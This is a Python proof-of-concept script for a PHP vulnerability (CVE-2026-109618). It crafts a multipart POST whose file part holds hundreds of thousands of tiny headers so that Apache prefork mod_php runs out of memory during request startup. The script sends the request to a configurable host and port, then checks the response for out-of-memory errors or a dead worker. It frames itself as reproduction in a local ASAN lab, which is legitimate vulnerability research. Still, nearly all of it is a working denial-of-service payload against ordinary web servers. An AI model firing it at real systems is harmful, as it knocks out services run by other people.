#!/usr/bin/env python3
"""
CVE-2026-109618 (GHSA-w8hw-w9fx-j79w) — condition reproduction:
OOM-during-startup on Apache prefork mod_php.

Advisory mechanism under test:
  "A multipart part can contain an unrestricted number of headers.
   Representing these headers inside PHP can use substantially more
   memory than their wire representation, allowing a request within
   post_max_size to exhaust the normal memory_limit."
  "Apache mod_php unconditionally invokes the request shutdown
   procedure, even when request startup has failed."

Trigger: one file part whose headers number in the tens of thousands.
Wire size stays tiny (well under post_max_size=128M); the in-memory
header representation blows memory_limit=128M during request startup.
On prefork mod_php, request shutdown then runs and processes the
invalid state -> we capture the result (crash / ASAN report in the
error log).

This is a CONDITION reproduction (crash/DoS/UAF evidence), not an
exploit; corruption-to-RCE escalation is out of scope.

Usage:
  python3 verify_cve_109618_oom.py [--host 127.0.0.1] [--port 18082]
  docker logs php-asan-modphp-lab   # ASAN evidence
"""
import argparse
import socket
import sys


def build_oom_request(host, path, header_count):
    # Shortest distinct header lines ("X%08x: v\r\n" = 9 bytes each) maximize
    # the per-header in-memory cost (estrdup + smart_string + llist entry,
    # ASAN-amplified) while keeping the wire size low.
    boundary = "OOMTRIG"
    headers = b"".join(b"X%08x: v\r\n" % i for i in range(header_count))
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="oom_trigger.bin"\r\n'
        + headers +
        b"Content-Type: application/octet-stream\r\n"
        b"\r\nZ\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18082)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--headers", type=int, default=560000,
                    help="headers per part (~5.1MB wire, under post_max_size=8M; "
                         "in-memory cost exceeds memory_limit=128M — "
                         "empirically calibrated; adjust down if post_max_size")

    args = ap.parse_args()

    print("[*] CVE-2026-109618 condition reproduction: OOM during request startup")
    print(f"[*] Target: http://{args.host}:{args.port}{args.path}")
    print(f"[*] Multipart part with {args.headers} headers")
    print()

    req = build_oom_request(args.host, args.path, args.headers)
    print(f"[*] Wire size: {len(req)} bytes (under post_max_size=8M)")
    print("[*] In-memory header representation >> memory_limit=128M")
    print()

    print("[*] Firing (may take a while under ASAN)...")
    oom_evidence = None
    try:
        s = socket.create_connection((args.host, args.port), timeout=300)
        s.sendall(req)
        s.settimeout(300)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
                if not d:
                    break
                resp += d
            except socket.timeout:
                break
        s.close()
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<no response / worker died>"
        print(f"    Response: {status}")
        body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
        if b"Allowed memory size" in body and b"exhausted" in body:
            line = [l for l in body.decode("latin1", "replace").splitlines() if "Allowed memory size" in l]
            print(f"    [EVIDENCE] OOM fatal during request startup: {line[0].strip()[:120]}")
            oom_evidence = line[0].strip()[:200]
    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"    [EVIDENCE] Connection died mid-request: {e}")
    except socket.timeout:
        print("    [EVIDENCE] Timeout - worker likely stuck/dead")

    print()
    if oom_evidence:
        print("[*] CVE-2026-109618 TRIGGER CONDITION REPRODUCED:")
        print("    OOM interrupts request startup (before any application code);")
        print("    on prefork mod_php the request shutdown procedure runs")
        print("    unconditionally after failed startup (per GHSA-w8hw-w9fx-j79w).")
        print("    NOTE: trigger reproduction only - shutdown consumption of the")
        print("    invalid state leading to corruption is NOT demonstrated here")
        print("    (no ASAN report / crash observed with this trigger point);")
        print("    that escalation is out of scope for this repo.")
    else:
        print("[*] No OOM observed - tune --headers for the target's")
        print("    post_max_size (must stay under) and memory_limit (must exceed).")
    print()
    print("[*] Also check server-side: docker logs php-asan-modphp-lab 2>&1 | grep -iE 'ASAN|memory|child'")


if __name__ == "__main__":
    main()